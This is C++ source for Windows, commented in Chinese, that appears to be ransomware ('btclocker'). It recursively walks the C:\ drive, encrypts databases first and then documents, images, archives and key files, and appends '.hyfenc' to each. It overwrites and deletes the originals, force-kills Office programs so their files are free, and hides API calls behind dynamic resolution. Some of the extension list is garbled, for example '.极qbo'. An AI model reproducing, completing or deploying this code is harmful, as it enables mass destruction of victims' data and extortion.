        status = BCryptGenRandom(NULL, context->iv.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error(std::string("BCryptGenRandom failed: ") + to_hex(status));
        }

        // 使用异步内存映射文件
        AsyncMemoryMappedFile inputMap;
        if (!inputMap.open(inputFile, GENERIC_READ, PAGE_READONLY, FILE_MAP_READ)) {
            DWORD error = g_APIs.pGetLastError();
            throw std::runtime_error(std::string("Failed to memory map input file. Error: ") + std::to_string(error));
        }

        context->fileSize = inputMap.getSize();
        if (context->fileSize == 0) {
            throw std::runtime_error("Input file is empty");
        }

        std::string extension = inputFile.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite",
            ".sqlite3", ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd",
            ".ora", ".dmp", ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        context->isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();

        // 创建输出文件
        context->hOutputFile = g_APIs.pCreateFileW(outputFile.c_str(), GENERIC_READ | GENERIC_WRITE,
            0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
        if (context->hOutputFile == INVALID_HANDLE_VALUE) {
            DWORD error = g_APIs.pGetLastError();
            throw std::runtime_error(std::string("CreateFile failed for output. Error: ") + std::to_string(error));
        }

        // 关联输出文件到IOCP
        if (!getGlobalIOCPPool()->associateDevice(context->hOutputFile, reinterpret_cast<ULONG_PTR>(context.get()))) {
            throw std::runtime_error("Failed to associate output file with IOCP");
        }

        // 输出文件大小计算
        size_t outputSize = context->fileSize;
        if (!context->isDatabaseFile) {
            outputSize += IV_LENGTH; // 非数据库文件，在文件开头添加IV
        }

        // 设置文件大小
        LARGE_INTEGER liSize;
        liSize.QuadPart = outputSize;
        if (!g_APIs.pSetFilePointerEx(context->hOutputFile, liSize, NULL, FILE_BEGIN)) {
            DWORD error = g_APIs.pGetLastError();
            throw std::runtime_error(std::string("SetFilePointerEx failed. Error: ") + std::to_string(error));
        }

        if (!g_APIs.pSetEndOfFile(context->hOutputFile)) {
            DWORD error = g_APIs.pGetLastError();
            throw std::runtime_error(std::string("SetEndOfFile failed. Error: ") + std::to_string(error));
        }

        // 如果不是数据库文件，先写入IV
        if (!context->isDatabaseFile) {
            AsyncIOContext ivContext;
            ivContext.operationType = AsyncIOType::WRITE;
            ivContext.overlapped.hEvent = reinterpret_cast<HANDLE>(context.get());
            ivContext.callback = [](bool success, DWORD error) {
                if (!success) {
                    std::cerr << "IV写入失败: " << error << std::endl;
                }
                };

            LARGE_INTEGER ivOffset;
            ivOffset.QuadPart = 0;

            if (!ivContext.allocateBuffer(IV_LENGTH)) {
                throw std::runtime_error("Failed to allocate IV buffer");
            }

            memcpy(ivContext.buffer, context->iv.data(), IV_LENGTH);

            // 同步写入IV，确保它在分块加密开始前就写入
            DWORD bytesWritten = 0;
            if (!g_APIs.pWriteFile(context->hOutputFile, ivContext.buffer, IV_LENGTH, &bytesWritten, NULL) ||
                bytesWritten != IV_LENGTH) {
                throw std::runtime_error("Failed to write IV");
            }
        }

        // 计算分块信息
        context->totalChunks = (context->fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
        context->ioContexts.resize(context->totalChunks * 2); // 每个块需要读和写两个上下文
        context->encryptedChunks.resize(context->totalChunks);
        context->chunkBuffers.resize(context->totalChunks);

        // 为每个块准备异步操作
        for (size_t chunkIndex = 0; chunkIndex < context->totalChunks; ++chunkIndex) {
            size_t chunkOffset = chunkIndex * CHUNK_SIZE;
            size_t currentChunkSize = custom_min(CHUNK_SIZE, context->fileSize - chunkOffset);

            // 计算加密大小
            size_t encryptSize = 0;
            if (context->fileSize < 1024 * 1024) { // 小于1MB
                if (chunkIndex == 0) { // 只加密第一个块的头部
                    encryptSize = custom_min(static_cast<size_t>(HEADER_ENCRYPT_SIZE), currentChunkSize);
                }
            }
            else { // 大于等于1MB
                encryptSize = CalculateChunkEncryptSize(currentChunkSize);
                encryptSize = custom_min(encryptSize, currentChunkSize);
            }

            // 准备读取上下文
            AsyncIOContext& readContext = context->ioContexts[chunkIndex];
            readContext.operationType = AsyncIOType::READ;
            readContext.chunkIndex = chunkIndex;
            readContext.overlapped.hEvent = reinterpret_cast<HANDLE>(context.get());
            readContext.callback = AsyncEncryptCallback;

            LARGE_INTEGER readOffset;
            readOffset.QuadPart = chunkOffset;

            // 分配缓冲区并复制数据
            context->chunkBuffers[chunkIndex].resize(encryptSize);
            memcpy(context->chunkBuffers[chunkIndex].data(),
                static_cast<BYTE*>(inputMap.data()) + chunkOffset, encryptSize);

            // 准备加密输出缓冲区
            context->encryptedChunks[chunkIndex].resize(encryptSize + 16); // 额外空间用于填充

            // 直接处理加密，不发起异步读取（因为数据已经在内存中）
            AsyncEncryptCallback(&readContext, true, ERROR_SUCCESS);
        }

        // 等待所有操作完成
        std::future<bool> result = context->completionPromise.get_future();
        bool success = result.get();

        inputMap.close();

        if (success) {
            // 加密成功后安全删除源文件
            SecureDelete(inputFile);
            std::cout << "文件加密并源文件删除成功: " << inputFile << " -> " << outputFile << std::endl;
        }

        return success;
    }
    catch (const std::exception& e) {
        std::cerr << "加密错误: " << e.what() << " 文件: " << inputFile << std::endl;

        // 清理可能创建的不完整输出文件
        std::error_code ec;
        fs::remove(outputFile, ec);

        return false;
    }
}

// 遍历目录并异步加密文件
inline void traverseAndEncryptAsync(const fs::path& directoryPath, const std::vector<std::string>& extensions, const BYTE* key) {
    try {
        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
            std::cerr << "Invalid directory: " << directoryPath << std::endl;
            return;
        }

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        AsyncEncryptionManager manager;
        manager.startProcessing();

        size_t fileCount = 0;
        size_t dbFileCount = 0;
        size_t otherFileCount = 0;
        size_t smallFileCount = 0; // 小于1MB的文件
        size_t largeFileCount = 0; // 大于等于1MB的文件

        // 第一阶段：优先处理数据库文件
        std::cout << "第一阶段：优先处理数据库文件..." << std::endl;
        for (const auto& entry : fs::recursive_directory_iterator(
            directoryPath, fs::directory_options::skip_permission_denied)) {

            if (!entry.is_regular_file()) continue;

            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

            // 检查是否是数据库文件
            bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
            if (!isDatabaseFile) continue;

            bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                [&](const std::string& targetExt) {
                    std::string lowerTarget = targetExt;
                    std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(),
                        ::tolower);
                    return ext == lowerTarget;
                });

            if (shouldEncrypt) {
                fs::path outputFile = entry.path();
                outputFile += ".hyfenc";

                manager.addTask(entry.path(), outputFile, key);
                fileCount++;
                dbFileCount++;

                // 统计文件大小分类
                size_t fileSize = entry.file_size();
                if (fileSize < 1024 * 1024) {
                    smallFileCount++;
                }
                else {
                    largeFileCount++;
                }
            }
        }

        // 第二阶段：处理其他文件
        std::cout << "第二阶段：处理其他文件..." << std::endl;
        for (const auto& entry : fs::recursive_directory_iterator(
            directoryPath, fs::directory_options::skip_permission_denied)) {

            if (!entry.is_regular_file()) continue;

            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

            // 数据库文件已经在第一阶段处理过了
            bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
            if (isDatabaseFile) continue;

            bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                [&](const std::string& targetExt) {
                    std::string lowerTarget = targetExt;
                    std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(),
                        ::tolower);
                    return ext == lowerTarget;
                });

            if (shouldEncrypt) {
                fs::path outputFile = entry.path();
                outputFile += ".hyfenc";

                manager.addTask(entry.path(), outputFile, key);
                fileCount++;
                otherFileCount++;

                // 统计文件大小分类
                size_t fileSize = entry.file_size();
                if (fileSize < 1024 * 1024) {
                    smallFileCount++;
                }
                else {
                    largeFileCount++;
                }
            }
        }

        std::cout << "开始加密 " << fileCount << " 个文件 ("
            << dbFileCount << " 个数据库文件, "
            << otherFileCount << " 个其他文件, "
            << smallFileCount << " 个小于1MB文件, "
            << largeFileCount << " 个大于等于1MB文件)..." << std::endl;

        manager.waitForCompletion();
        manager.stopProcessing();

        // 显示加密统计信息
        manager.printStatistics();

        std::cout << "完成加密 " << fileCount << " 个文件." << std::endl;
        std::cout << "加密策略: 数据库文件(全文件加密), 非数据库文件(小于1MB:头部4KB, 大于等于1MB:分块15%)" << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "严重错误: " << e.what() << std::endl;
    }
}

// 实现辅助函数
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    NTSTATUS status = BCryptGenRandom(
        NULL, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );
    if (!NT_SUCCESS(status)) {
        throw std::runtime_error(std::string("BCryptGenRandom failed: ") + to_hex(status));
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    fs::path savePath = GetUserDocumentsPath() / fileName;

    try {
        std::ofstream keyFile(savePath, std::ios::binary);
        if (!keyFile) return false;

        keyFile.write(reinterpret_cast<const char*>(key), length);
        return keyFile.good();
    }
    catch (...) {
        return false;
    }
}

inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = g_APIs.pSHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
    if (SUCCEEDED(hr)) {
        fs::path docsPath(path);
        CoTaskMemFree(path);
        return docsPath;
    }
    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
    return fs::current_path();
}

inline bool IsAesNiSupported() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1); // 获取CPU功能标志

    // 检查第25位 (AES-NI支持标志)
    return (cpuInfo[2] & (1 << 25)) != 0;
}

inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
    return ss.str();
}

// SecureDelete函数实现
bool SecureDelete(const fs::path& path) {
    // 检查文件是否存在
    if (!fs::exists(path)) {
        std::cout << "文件不存在: " << path << std::endl;
        return true;
    }

    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fileSize = { 0 };

    try {
        // 1. 打开文件（使用异步标志提升性能）
        hFile = g_APIs.pCreateFileW(
            path.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ,  // 允许其他进程读，防止阻塞
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_WRITE_THROUGH,
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = g_APIs.pGetLastError();
            throw std::runtime_error(std::string("无法打开文件进行安全删除。错误代码: ") + std::to_string(error));
        }

        // 2. 获取文件大小
        if (!g_APIs.pGetFileSizeEx(hFile, &fileSize)) {
            throw std::runtime_error(std::string("无法获取文件大小。错误代码: ") + std::to_string(g_APIs.pGetLastError()));
        }

        // 处理空文件
        if (fileSize.QuadPart == 0) {
            g_APIs.pCloseHandle(hFile);
            // 直接删除空文件
            return g_APIs.pDeleteFileW(path.c_str());
        }

        // 3. 单次随机数据覆写（针对现代存储的平衡方案）
        const DWORD bufferSize = 64 * 1024; // 64KB缓冲区平衡内存和效率
        std::vector<BYTE> randomBuffer(bufferSize);

        // 使用密码学安全的随机数生成器
        std::random_device rd;
        std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());

        // 生成随机缓冲区内容
        std::generate(randomBuffer.begin(), randomBuffer.end(), rng);

        LARGE_INTEGER offset = { 0 };
        DWORD bytesWritten = 0;
        LONGLONG remainingBytes = fileSize.QuadPart;

        // 分块覆写文件
        while (remainingBytes > 0) {
            DWORD chunkSize = static_cast<DWORD>((bufferSize < remainingBytes) ? bufferSize : remainingBytes);

            // 设置写入位置
            offset.QuadPart = fileSize.QuadPart - remainingBytes;
            if (!g_APIs.pSetFilePointerEx(hFile, offset, NULL, FILE_BEGIN)) {
                throw std::runtime_error(std::string("设置文件指针失败。错误代码: ") + std::to_string(g_APIs.pGetLastError()));
            }

            // 写入随机数据
            if (!g_APIs.pWriteFile(hFile, randomBuffer.data(), chunkSize, &bytesWritten, NULL)) {
                throw std::runtime_error(std::string("写入随机数据失败。错误代码: ") + std::to_string(g_APIs.pGetLastError()));
            }

            if (bytesWritten != chunkSize) {
                throw std::runtime_error(std::string("部分写入错误。预期: ") + std::to_string(chunkSize) +
                    std::string(", 实际: ") + std::to_string(bytesWritten));
            }

            remainingBytes -= chunkSize;
        }

        // 4. 强制刷新到磁盘（确保数据物理写入）
        FlushFileBuffers(hFile);
        g_APIs.pCloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        // 5. 文件名混淆（增加恢复难度）
        fs::path tempPath = path;
        std::random_device nameRd;
        std::mt19937 nameGen(nameRd());
        std::uniform_int_distribution<> nameDis(0, 15);

        // 随机重命名2-3次
        int renameCount = 2 + (nameDis(nameGen) % 2);
        for (int i = 0; i < renameCount; ++i) {
            std::stringstream newName;
            newName << "del_";
            for (int j = 0; j < 8; ++j) {
                newName << std::hex << nameDis(nameGen);
            }
            newName << ".tmp";

            fs::path newPath = path.parent_path() / newName.str();
            try {
                fs::rename(tempPath, newPath);
                tempPath = newPath;
            }
            catch (const fs::filesystem_error&) {
                // 重命名失败不影响主要流程
                break;
            }
        }

        // 6. 最终删除
        bool deleteSuccess = g_APIs.pDeleteFileW(tempPath.c_str());

        if (deleteSuccess) {
            std::cout << "安全删除成功: " << path << std::endl;
        }
        else {
            std::cerr << "最终删除失败: " << tempPath << " 错误: " << g_APIs.pGetLastError() << std::endl;
        }

        return deleteSuccess;
    }
    catch (const std::exception& e) {
        std::cerr << "安全删除失败 " << path << ": " << e.what() << std::endl;

        // 清理资源
        if (hFile != INVALID_HANDLE_VALUE) {
            g_APIs.pCloseHandle(hFile);
        }

        // 回退到普通删除
        std::error_code ec;
        return fs::remove(path, ec);
    }
}

// 主函数（完全集成到异步I/O体系）
inline int encrypthf() {
    // 初始化动态API
    if (!g_APIs.Initialize()) {
        std::cerr << "Failed to initialize dynamic APIs" << std::endl;
        return 1;
    }

    bool hwAccelSupported = IsAesNiSupported();
    std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

    if (!hwAccelSupported) {
        std::cout << "Warning: Hardware acceleration (AES-NI) not detected. Encryption will be performed in software mode, which may be slower." << std::endl;
    }

    // 关闭可能占用文件的应用程序
    system("taskkill /f /im winword.exe > nul 2>&1");
    system("taskkill /f /im excel.exe > nul 2>&1");
    system("taskkill /f /im powerpnt.exe > nul 2>&1");
    Sleep(500);

    // 生成随机密钥
    BYTE encryptionKey[KEY_LENGTH];
    GenerateRandomKey(encryptionKey, KEY_LENGTH);
    if (!SaveKeyToDocuments(encryptionKey, KEY_LENGTH, L"btclocker_key.bin")) {
        std::cerr << "Failed to save encryption key!" << std::endl;
        return 1;
    }

    // 目标文件扩展名
    std::vector<std::string> extensions = {
        ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
        ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
        ".qbb", ".极qbo", ".ofx",
        ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
        ".psd", ".ai", ".dwg", ".skp",
        ".vmdk", ".iso", ".pfx", ".pems",
        ".pst", ".mbox", ".mpp",
        ".jar", ".zip", ".tar.gz",
        ".pptx", ".ppt", ".jpg", ".png", ".txt", ".jpeg"
    };

    fs::path targetDirectory = L"C:\\";
    std::cout << "Target directory: " << targetDirectory << std::endl;

    // 使用异步加密管理器
    traverseAndEncryptAsync(targetDirectory, extensions, encryptionKey);

    // 显示完成信息
    std::cout << "加密任务已完成!" << std::endl;

    return 0;
}

#endif // ENCRYPTION_UTILS_H